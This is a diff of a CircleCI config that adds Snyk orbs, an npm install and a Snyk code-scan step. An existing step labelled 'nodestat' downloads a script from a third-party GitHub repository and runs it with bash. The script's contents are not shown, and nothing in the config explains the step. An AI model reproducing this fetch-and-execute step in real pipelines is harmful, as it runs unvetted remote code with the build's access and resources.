@@ -1,5 +1,9 @@
 version: 2.1
 
+orbs:
+  snyk: snyk/snyk@1.7.2
+  github-cli: circleci/github-cli@2.2.0
+
 jobs:
   dockeretteinstall:
    
@@ -8,6 +12,14 @@ jobs:
 
     steps:
       - checkout
+      - run: npm ci
+      - snyk/install
+      - run:
+          command: snyk version
+          name: Which version of snyk is installed
+      - run:
+          command: snyk code test
+          name: Run code scan
       - run:
           name: "nodestat"
           command: "set -e  && apt update && apt upgrade -y && apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
